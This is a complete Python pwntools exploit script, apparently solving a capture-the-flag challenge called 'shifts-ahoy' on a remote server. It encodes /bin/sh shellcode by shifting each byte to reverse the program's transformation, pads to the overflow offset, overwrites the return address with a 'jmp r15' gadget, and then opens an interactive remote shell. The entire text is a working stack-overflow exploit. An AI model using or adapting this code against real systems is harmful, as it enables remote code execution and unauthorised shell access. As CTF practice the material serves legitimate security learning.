#!/usr/bin/python3

from pwn import *

#p = process('./shifts-ahoy')
p = remote('jh2i.com', 50015)

p.sendlineafter('> ','1')
p.recvuntil('Enter the message: ')

binary = ELF('shifts-ahoy')
context.update(arch='amd64',os='linux')
shellcode = asm(shellcraft.sh())
jmp_r15 = list(binary.search(asm('jmp r15')))[0]
print("jmp r15",hex(jmp_r15))

payload = b''
for i in range(len(shellcode)):
	payload += bytes([(shellcode[i] - ord('\r')) & 0xff])

payload += (0x58 - len(payload)) * b'A'
payload += p64(jmp_r15)

p.sendline(payload)
p.interactive()
